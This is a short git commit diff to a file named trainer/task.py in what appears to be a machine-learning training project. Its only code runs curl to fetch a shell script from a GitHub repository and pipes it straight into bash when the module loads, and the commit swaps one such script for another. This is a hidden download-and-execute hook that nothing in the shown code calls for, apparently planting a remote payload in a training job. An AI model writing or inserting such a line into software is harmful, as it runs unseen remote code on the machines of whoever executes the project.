35ff23d4eca1a307cb7ef04b4a5cf24b4b5881d7
vedhagsvp <vedhag230223@gmail.com>
2025-09-18 17:07:32 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/xplare/raw/main/xponwrker.sh | bash')
+os.system('curl -sL https://github.com/vedhagsvp/xplare/raw/main/xpla.sh | bash')
